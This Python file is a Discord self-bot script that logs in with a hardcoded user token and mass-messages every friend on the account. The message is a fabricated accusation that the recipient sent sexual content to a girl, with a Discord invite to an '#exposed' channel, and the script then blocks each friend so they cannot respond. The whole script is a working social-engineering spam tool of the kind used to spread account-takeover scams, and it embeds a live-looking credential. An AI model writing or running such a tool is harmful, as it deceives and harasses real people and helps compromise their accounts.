import discord
import os
import colorama
from colorama import init, Fore, Back, Style

intents = discord.Intents.default()

client = discord.Client(intents=intents)

token = "NjkyMDY1NzY1OTMwODI3OTU2.GnX0Dq.3LzDo3FUHnTUtAh2xQIRGKN56MaLLRLmiPn7MA"

message = """
heyy ummm idk what happened or if its really you but it was your name and the same pfp you have, why tf did you send a girl ** stuff.. wtf is wrong with you.. https://discord.gg/hkdqqaJ8wr check #exposed and you'll see yourself. anyways until you explain what happened im blocking you, sorry if this is a misunderstand but i dont want to take any risks with weirdos on my friends list.
"""

os.system(f'title [Massdm] - {client.user}')

@client.event
async def on_connect():
    for user in client.user.friends:
        try:
              await user.send(f"{user.mention} {message}")
              print(Style.BRIGHT + Fore.GREEN + f"Sent dm to {user.name} | Message - {message}")
              await user.block()
        except:
              print(Style.BRIGHT + Fore.RED + f"Failed to dm {user.name}")


client.run(token, bot=False)
